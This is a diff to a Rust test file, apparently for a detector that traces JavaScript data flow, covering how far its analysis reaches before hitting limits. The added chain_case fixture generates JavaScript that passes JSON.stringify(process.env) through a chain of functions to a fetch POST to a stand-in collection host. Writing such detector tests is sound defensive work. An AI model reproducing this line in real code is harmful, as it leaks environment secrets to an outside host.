@@ -114,27 +114,37 @@ fn params_case(n: usize) -> String {
     out
 }
 
+/// BIG-BUNDLE-TAIL: `n` functions, each declaring its own `d` and giving it to the one before it in the text, the
+/// first in the text sending it: the narrowing reading follows the data one function a pass (core's reading, which
+/// takes every `d` for one, at once).
+fn chain_case(n: usize) -> String {
+    let mut out = format!("function g{}(v){{const d=v;fetch('https://review.invalid/collect',{{method:'POST',body:d}});}}\n", n - 1);
+    for k in (0..n - 1).rev() {
+        out.push_str(&format!("function g{k}(v){{const d=v;g{}(d);}}\n", k + 1));
+    }
+    out.push_str("g0(JSON.stringify(process.env));\n");
+    out
+}
+
 #[test]
 fn a_reading_that_met_a_limit_reads_as_core_does_too() {
-    // (the follower's limits, as the pack has them: the boundaries below are theirs)
+    // (the follower's limits, as the pack has them, and their room in a text of each length: BIG-BUNDLE-TAIL)
     let p = crate::pack::current();
     assert_eq!((p.usize("_DD_MAX_CALLS"), p.usize("_LD_MAX")), (100, 200));
-    // returns: 100 are read (n others and collect's); calls: 200 (noop's and send's definitions, n calls, the call);
-    // parameter maps: 200 (n functions and send; the calls of their names, 200, are met first: the definitions of 199
-    // and the call before them). Some(true): a limit met, and the narrowing reading alone loses the send (core's
-    // reading finds it); Some(false): no limit met
-    let cases: Vec<(String, String, Option<bool>)> = [0, 98, 99]
+    // the review's boundaries (returns: 100 were read; calls: 200; parameter maps: 200) meet no limit now (each list
+    // holds what a text of its length can); a chain longer than the reading's passes does. Some(true): a limit met,
+    // and the narrowing reading alone loses the send (core's reading finds it); Some(false): no limit met
+    let cases: Vec<(String, String, Option<bool>)> = [0, 98, 99, 100, 101, 200]
         .iter()
         .map(|&n| (format!("returns {n}"), returns_case(n), Some(false)))
-        .chain([100, 101, 200].iter().map(|&n| (format!("returns {n}"), returns_case(n), Some(true))))
-        .chain([0, 190, 196, 197].iter().map(|&n| (format!("calls {n}"), calls_case(n), Some(false))))
-        .chain([198, 199, 200, 201].iter().map(|&n| (format!("calls {n}"), calls_case(n), Some(true))))
-        .chain([(198, Some(false)), (199, None), (200, Some(true)), (201, Some(true))].iter().map(|&(n, l)| (format!("parameters {n}"), params_case(n), l)))
+        .chain([0, 190, 196, 197, 198, 199, 200, 201].iter().map(|&n| (format!("calls {n}"), calls_case(n), Some(false))))
+        .chain([198, 199, 200, 201].iter().map(|&n| (format!("parameters {n}"), params_case(n), Some(false))))
+        .chain([(100, Some(false)), (300, Some(true))].iter().map(|&(n, l)| (format!("a chain of {n}"), chain_case(n), l)))
         .collect();
     let plain = plain_long();
     for (what, text, limited) in &cases {
         let (got, capped, narrowed) = reading(text);
-        assert!(narrowed, "{what}: collect's `d` is collect's");
+        assert!(narrowed, "{what}: a function's `d` is its own");
         match limited {
             Some(false) => {
                 assert!(!capped, "{what}: no limit met");
